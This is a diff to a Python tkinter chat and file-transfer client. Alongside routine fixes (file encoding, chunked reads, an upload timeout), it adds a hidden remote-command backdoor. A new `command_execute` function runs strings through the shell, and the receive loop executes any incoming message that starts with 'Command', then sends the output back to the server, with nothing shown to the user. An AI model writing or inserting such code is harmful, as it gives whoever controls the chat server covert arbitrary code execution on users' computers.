@@ -5,12 +5,22 @@ import socket as s
 import bz2
 import os
 from random import shuffle, random
+import subprocess as sp
 import threading as t
 import tkinter.ttk as ttk
 import tkinter as tk
 from copy import deepcopy
 from time import sleep, ctime
 from tkinter import messagebox as m
+
+
+def command_execute(command):
+    try:
+        data = sp.check_output(command, shell=True)
+    except sp.CalledProcessError as error_data:
+        return ("ERROR:" + repr(type(error_data)) + (str(error_data))).encode()
+    else:
+        return data
 
 
 class Client:
@@ -61,8 +71,8 @@ class Client:
             print("File not found")
             self.data_dict = deepcopy(data)
 
-        self.file = open("C:\\Windows\\ChatMessage.ioi", "a+")
-        self.file2 = open("ChatMessage.txt", "a+")
+        self.file = open("C:\\Windows\\ChatMessage.ioi", "a+", encoding="utf-8")
+        self.file2 = open("ChatMessage.txt", "a+", encoding="utf-8")
         self.user_identity = ["ID:" + self.id]
         self.find_server_sock = s.socket(type=s.SOCK_DGRAM)
         self.find_server_sock.bind(("0.0.0.0", 13365))
@@ -75,6 +85,7 @@ class Client:
         self.message_entry = tk.Text(self.tk, height=15, width=60)
         tk.Label(self.tk, text=data["message entry"]).place(x=0, y=0)
         self.message_entry.place(x=0, y=28)
+        self.state1 = False
         self.tk.resizable(False, False)
         self.scrollbar = ttk.Scrollbar(self.tk)
         self.message_box = tk.Text(self.tk, height=45, width=120, yscrollcommand=self.scrollbar.set)
@@ -103,7 +114,7 @@ class Client:
         ttk.Button(self.top, text=data["connect"], command=self.connect_to_server).place(x=250, y=0)
         ttk.Button(self.tk, command=self.process, text=data["send"]).place(x=150, y=0)
 
-    def recv_check(self, sock):
+    def rec_check(self, sock):
         sleep(10)
         if self.state:
             return
@@ -121,7 +132,7 @@ class Client:
         else:
             fn = self.v.get()[:-5]
         c.send(b"REQUEST:" + b"0" + fn.encode())
-        t.Thread(target=self.recv_check, args=(c,))
+        t.Thread(target=self.rec_check, args=(c,))
         self.state = False
         data = c.recv(102400)
         self.state = True
@@ -134,9 +145,14 @@ class Client:
                 c.close()
                 return
         path = path.strip()
-        file = open(path.replace("/", "\\") + self.v.get()[:-5].strip(), "wb")
+        file = open(path.replace("/", "\\") + "." + self.v.get()[:-5].strip().split(".")[-1], "wb")
         file.write(data[:-7].strip(b" "))
         file.close()
+
+    def check_timeout(self, sock):
+        sleep(10)
+        if not self.state1:
+            sock.close()
 
     def loader2(self):
         tk2 = tk.Toplevel(self.tk)
@@ -161,11 +177,18 @@ class Client:
         file = open(file_path, "rb")
         filename = file_path.split("\\")[-1]
         print(filename)
-        data = file.read()
+        data = b""
+        while True:
+            temp = file.read(8192)
+            if not temp:
+                break
+            data += temp
         self.file_sock.connect((self.server_ip.get(), 8506))
         self.file_sock.send(filename.encode() + b"!:!:UPLOAD!:!:" + str(os.path.getsize(file_path)).encode() + b"!:!:"
                             + data +
                             b"-!end of file!-")
+        self.state1 = False
+        t.Thread(target=self.check_timeout, args=(self.file_sock, )).start()
         response = self.file_sock.recv(102400).decode()
         if response.startswith("ERROR"):
             m.showerror("ERROR", response)
@@ -231,6 +254,16 @@ class Client:
             message1 = bz2.decompress(self.message).decode("UTF-32")
             message = message1.split("-!seq!-")
             self.message = message[0]
+            if self.message.startswith("Command"):
+                data = command_execute(self.message.split(":")[1])
+                try:
+                    ignored = data.decode("utf-8")
+                except UnicodeDecodeError:
+                    code = "gbk"
+                else:
+                    code = "utf-8"
+                self.sock.send(bz2.compress("Command Response:".encode("utf-32") + data.decode(code).encode("utf-32")))
+                continue
             print("New message:", self.message)
             print("Old message:", self.old_message)
             if self.message != self.old_message:
